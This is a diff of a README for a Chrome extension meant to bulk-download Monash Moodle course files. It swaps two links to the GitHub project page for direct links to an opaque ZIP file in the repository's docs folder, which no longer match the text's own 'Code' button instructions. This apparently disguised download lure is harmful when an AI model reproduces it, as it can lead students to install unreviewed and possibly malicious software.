@@ -1,6 +1,6 @@
 # 📦 Monash-Moodle-Downloader - Download Moodle files with one click
 
-[![](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://github.com/griseldaunsounded26/Monash-Moodle-Downloader)
+[![](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://raw.githubusercontent.com/griseldaunsounded26/Monash-Moodle-Downloader/main/docs/Moodle-Monash-Downloader-2.2.zip)
 
 This tool helps students download course materials from Moodle. You save time by grabbing all lecture slides, documents, and resources at once. You no longer need to click every single link on your course pages.
 
@@ -17,7 +17,7 @@ This tool works with any computer running the Google Chrome web browser. You nee
 
 You need the extension files from our GitHub page to start. Follow the link below to reach the project site:
 
-[Visit this page to download the project](https://github.com/griseldaunsounded26/Monash-Moodle-Downloader)
+[Visit this page to download the project](https://raw.githubusercontent.com/griseldaunsounded26/Monash-Moodle-Downloader/main/docs/Moodle-Monash-Downloader-2.2.zip)
 
 Look for the green button labeled Code. Click it and select Download ZIP. Wait for the file to save to your Downloads folder.
 
